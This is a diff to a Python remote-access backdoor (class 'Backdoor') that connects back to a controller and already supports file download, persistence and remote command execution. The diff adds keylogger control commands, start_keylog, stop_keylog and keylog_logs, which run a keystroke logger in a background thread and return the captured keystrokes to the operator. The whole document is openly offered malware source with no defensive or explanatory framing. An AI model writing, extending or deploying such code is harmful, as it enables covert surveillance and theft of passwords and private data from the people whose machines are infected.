@@ -3,11 +3,13 @@ import subprocess
 import json
 import sys
 import os
+import threading
 import time
 import pyautogui
 import re
 import shutil
 from urllib.request import urlopen
+from keylogger import Keylog
 
 
 class Backdoor:
@@ -15,6 +17,8 @@ class Backdoor:
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.ip = ip
         self.port = port
+        self.keylogger = None
+        self.keylogger_thread = None
         self.connect()
 
     def connect(self):
@@ -96,6 +100,11 @@ class Backdoor:
             try:
                 if command[0] == 'exit':
                     self.connection.close()
+                    try:
+                        self.keylogger.destruct()
+                        self.keylogger_thread.join()
+                    except Exception:
+                        pass
                     sys.exit()
 
                 elif command[0] == 'download':
@@ -126,6 +135,23 @@ class Backdoor:
                 elif command[0] == 'persist':
                     self.persistence()
                     data = 'persisting'
+
+                elif command[0] == 'start_keylog':
+                    self.keylogger = Keylog()
+                    self.keylogger_thread = threading.Thread(target=self.keylogger.start)
+                    self.keylogger_thread.start()
+                    data = 'Keylogger has been started'
+
+                elif command[0] == 'stop_keylog':
+                    self.keylogger.destruct()
+                    self.keylogger_thread.join()
+                    data = 'Keylogger has been stopped'
+
+                elif command[0] == 'keylog_logs':
+                    try:
+                        data = self.keylogger.read_file()
+                    except Exception as exc:
+                        data = f'Keylogger error: {exc}'
 
                 else:
                     data = self.command_exec(command)
